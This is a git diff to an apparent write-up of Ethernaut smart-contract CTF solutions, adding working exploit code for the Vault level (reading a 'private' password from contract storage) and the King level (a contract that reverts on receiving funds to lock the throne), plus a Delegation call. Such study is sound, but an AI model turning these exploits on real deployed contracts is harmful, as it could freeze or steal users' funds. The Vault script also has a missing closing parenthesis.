@@ -185,10 +185,10 @@ await contract.transfer(level, 21)
 
 ## 06 Delegation
 
-In `npx hardhat console` execute `(new hre.ethers.Interface(['function pwn()'])).encodeFunctionData('pwn')` to get 0xdd365b8b
+In `npx hardhat console` execute `(new hre.ethers.Interface(["function pwn()"])).encodeFunctionData("pwn")` to get 0xdd365b8b
 
 ```js
-await sendTransaction({to: contract.address, from: player, data: '0xdd365b8b'})
+await sendTransaction({to: contract.address, from: player, data: "0xdd365b8b"})
 await contract.owner == player
 ```
 
@@ -209,3 +209,71 @@ Remember to include at least one wei with the deployment, ie `const contract = a
 
 Verify with `await getBalance(contract.address) > 0` in the Ethernaut Javascript console
 
+## 08 Vault
+
+```js
+const hre = require("hardhat");
+
+async function main() {
+  const target = "<target contract address>";
+  const value = await hre.ethers.provider.getStorage(target, 1);
+  console.log(`value = ${value}`);
+  console.log(`password = "${Buffer.from(value.substring(2), 'hex')}"`);
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+}
+```
+
+```js
+// The unlock function expects a bytes32 not a string ("A very strong secret password :)")
+await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
+await contract.locked() == false
+```
+
+## 09 King
+
+```sol
+pragma solidity ^0.8.0;
+
+contract KingAttack {
+    address payable public target;
+
+    constructor(address payable _target) {
+        target = _target;
+    }
+
+    function attack() external payable {
+        // Cannot use transfer because it does not provide sufficient gas (hardcoded at 2300)
+        // Ref: https://medium.com/coinmonks/solidity-transfer-vs-send-vs-call-function-64c92cfc878a
+        // target.transfer(msg.value);
+
+        (bool sent,) = target.call{value: msg.value}("");
+        require(sent);
+    }
+
+    receive() external payable {
+        revert();
+    }
+}
+```
+
+```js
+const hre = require("hardhat");
+
+async function main() {
+  const target = "<target contract address>";
+  const contract = await hre.ethers.deployContract("KingAttack", [target]);
+  await contract.waitForDeployment();
+  console.log(`Contract address: ${await contract.getAddress()}`);
+  // One wei more than `await contract.prize()` from the Ethernaut Javascript console
+  (await contract.attack({value: 1000000000000001})).wait();
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
+```
